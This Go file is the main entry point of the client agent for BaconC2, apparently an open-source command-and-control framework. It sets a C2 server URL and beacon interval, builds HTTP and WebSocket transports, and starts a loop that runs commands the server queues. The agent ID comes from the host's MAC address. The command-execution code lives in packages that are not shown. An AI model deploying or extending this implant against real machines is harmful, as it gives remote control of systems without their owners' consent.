package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
	"github.com/google/uuid"
)

var (
	defaultServerURL      = "http://localhost:8081"
	defaultBeaconInterval = 10 * time.Second
	defaultProtocol       = "http"
	defaultUDPHost        = "127.0.0.1"
	defaultUDPPort        = 9000
)

func main() {

	serverURL := flag.String("server", defaultServerURL, "C2 server URL (e.g. http://127.0.0.1:8081)")
	beaconInt := flag.Int("interval", int(defaultBeaconInterval.Seconds()), "Beacon interval in seconds")
	protocol := flag.String("protocol", defaultProtocol, "Communication protocol (http/ws)")
	udpHost := flag.String("udphost", defaultUDPHost, "UDP server host")
	udpPort := flag.Int("udpport", defaultUDPPort, "UDP server port")
	flag.Parse()

	cfg := &config.AgentConfig{
		AgentID:        generateAgentID(),
		ServerURL:      *serverURL,
		BeaconInterval: time.Duration(*beaconInt) * time.Second,
		Protocol:       *protocol,
		UDPServerHost:  *udpHost,
		UDPServerPort:  *udpPort,
	}

	cmdQueue := queue.NewMemoryQueue[models.Command]()
	resultQueue := queue.NewMemoryQueue[models.CommandResult]()

	encoderChain := encoders.NewChainEncoder([]encoders.Encoder{encoders.DummyEncoder{}})

	transportProtocol := transport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)

	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)
	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg)

	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)

	if err := client.Initialize(); err != nil {
		log.Fatalf("Failed to initialize agent: %v", err)
	}

	go commandExecutor.ProcessCommandQueue()

	if err := client.Start(); err != nil {
		log.Fatalf("Failed to start agent: %v", err)
	}

	log.Println("Agent client started successfully")

	// Handle termination signals
	sigChan := make(chan os.Signal, 1)

	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	client.Stop()
	log.Println("Agent client stopped")
}

func generateAgentID() string {
	platform := runtime.GOOS
	interfaces, err := net.Interfaces()
	if err != nil {
		return fmt.Sprintf("%s-%s", platform, uuid.New().String())
	}
	for _, i := range interfaces {
		if len(i.HardwareAddr) > 0 {
			return fmt.Sprintf("%s-%s", platform, i.HardwareAddr.String())
		}
	}
	return fmt.Sprintf("%s-%s", platform, uuid.New().String())
}
